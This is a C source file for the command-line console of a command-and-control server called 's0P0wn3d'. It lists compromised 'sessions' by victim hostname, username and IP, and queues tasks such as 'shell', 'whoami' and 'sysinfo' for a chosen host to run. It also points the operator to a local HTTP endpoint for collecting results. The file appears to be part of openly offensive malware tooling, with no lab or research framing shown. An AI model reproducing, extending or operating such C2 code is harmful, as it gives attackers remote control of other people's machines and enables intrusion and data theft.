/*
 * s0P0wn3d - Interactive CLI for controller
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "sessions.h"
#include "task_queue.h"
#include "../shared/protocol.h"

#define MAX_LINE 256

/* List active sessions */
static void list_sessions(void) {
    printf("\n[*] Active sessions:\n");
    printf("--------------------------------------------\n");

    session_t buf[S0P_MAX_SESSIONS];
    int count = sessions_list(buf, S0P_MAX_SESSIONS);

    if (count == 0) {
        printf("  (no sessions)\n");
        return;
    }

    for (int i = 0; i < count; i++) {
        printf("  [%d] %s\n", i, buf[i].session_id);
        printf("      Hostname: %s\n", buf[i].host.hostname);
        printf("      User: %s\n", buf[i].host.username);
        printf("      IP: %s\n", buf[i].host.ip);
        printf("\n");
    }
}

/* Add a task to a session */
static void add_task(const char *session_id) {
    char command[64];
    char args[256];

    printf("\n[*] Add a task\n");
    printf("Available commands: sysinfo, hostname, whoami, cwd, ls, echo, shell, ping, check\n");
    printf("Command: ");
    fgets(command, sizeof(command), stdin);
    command[strcspn(command, "\n")] = 0;

    printf("Arguments (or empty): ");
    fgets(args, sizeof(args), stdin);
    args[strcspn(args, "\n")] = 0;

    if (strlen(command) == 0) {
        printf("[-] Empty command\n");
        return;
    }

    task_t task = {0};
    strncpy(task.command, command, sizeof(task.command) - 1);
    strncpy(task.args, args, sizeof(task.args) - 1);

    task_queue_enqueue(session_id, &task);
    printf("[+] Task added: %s\n", command);
}

/* Get results for a session */
static void get_results(const char *session_id) {
    printf("\n[*] Getting results for %s...\n", session_id);
    printf("Use: curl -s http://localhost:8443/sessions/%s/results | jq .\n", session_id);
}

/* Main CLI menu */
void cli_menu(void) {
    char line[MAX_LINE];
    char session_id[128] = {0};

    printf("\n");
    printf("==================================================\n");
    printf("  s0P0wn3d C2 Controller CLI\n");
    printf("  Type 'help' for commands\n");
    printf("==================================================\n\n");

    while (1) {
        if (session_id[0]) {
            printf("s0p0wn3d [%s]> ", session_id);
        } else {
            printf("s0p0wn3d> ");
        }
        fflush(stdout);

        if (!fgets(line, sizeof(line), stdin)) break;
        line[strcspn(line, "\n")] = 0;

        if (strlen(line) == 0) continue;

        if (strcmp(line, "help") == 0) {
            printf("\nCommands:\n");
            printf("  sessions      - List active sessions\n");
            printf("  select <id>   - Select a session\n");
            printf("  add           - Add a task\n");
            printf("  results       - Get task results\n");
            printf("  clear         - Deselect session\n");
            printf("  quit          - Exit\n");
            printf("\n");
        }
        else if (strcmp(line, "sessions") == 0 || strcmp(line, "ls") == 0) {
            list_sessions();
        }
        else if (strncmp(line, "select ", 7) == 0) {
            strncpy(session_id, line + 7, sizeof(session_id) - 1);
            printf("[+] Session selected: %s\n", session_id);
        }
        else if (strcmp(line, "add") == 0) {
            if (session_id[0] == 0) {
                printf("[-] No session selected (use 'select <id>')\n");
            } else {
                add_task(session_id);
            }
        }
        else if (strcmp(line, "results") == 0) {
            if (session_id[0] == 0) {
                printf("[-] No session selected (use 'select <id>')\n");
            } else {
                get_results(session_id);
            }
        }
        else if (strcmp(line, "clear") == 0) {
            session_id[0] = 0;
            printf("[*] Session cleared\n");
        }
        else if (strcmp(line, "quit") == 0 || strcmp(line, "exit") == 0) {
            printf("[*] Goodbye!\n");
            break;
        }
        else {
            printf("[-] Unknown command (type 'help')\n");
        }
    }
}
